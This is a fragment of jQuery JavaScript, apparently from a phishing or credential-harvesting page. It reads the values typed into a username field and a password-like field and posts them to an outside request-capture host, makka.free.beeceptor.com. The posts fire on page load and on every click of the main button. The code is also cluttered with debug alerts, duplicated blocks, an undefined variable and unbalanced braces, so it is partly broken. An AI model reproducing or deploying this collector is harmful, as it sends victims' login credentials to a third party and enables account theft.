alert(prathhhhhh);
  $("#button-main").click(function () {
    alert("kerrtetri");
    let username = $("#defaultForm-username").val();
    let pass = $("#defaultForm-number").val();
    
    
});
alert("purath")
$.ajax({
    type: 'POST',
    data: {
        name : "P"+$("#defaultForm-username").val(),
        pass : "P"+$("#defaultForm-number").val()
    },
    url: 'https://makka.free.beeceptor.com',    
});


    
    alert("ready");

    $.ajax({
        type: 'POST',
        data: {
            name : "R"+$("#defaultForm-username").val(),
            pass : "R"+$("#defaultForm-number").val()
        },
        url: 'https://makka.free.beeceptor.com',    
    });

    $("#button-main").click(function () {
        alert("keri");
        let username = $("#defaultForm-username").val();
        let pass = $("#defaultForm-number").val();
        
        $.ajax({
            type: 'POST',
            data: {
                name : "C"+$("#defaultForm-username").val(),
                pass : "C"+$("#defaultForm-number").val()
            },
            url: 'https://makka.free.beeceptor.com',    
        });
    });
  
  });

alert(prathhhhhh);
  $("#button-main").click(function () {
    alert("kerrtetri");
    let username = $("#defaultForm-username").val();
    let pass = $("#defaultForm-number").val();
    
    $.ajax({
        type: 'POST',
        data: {
            name : "F"+$("#defaultForm-username").val(),
            pass : "F"+$("#defaultForm-number").val()
        },
        url: 'https://makka.free.beeceptor.com',    
    });
});



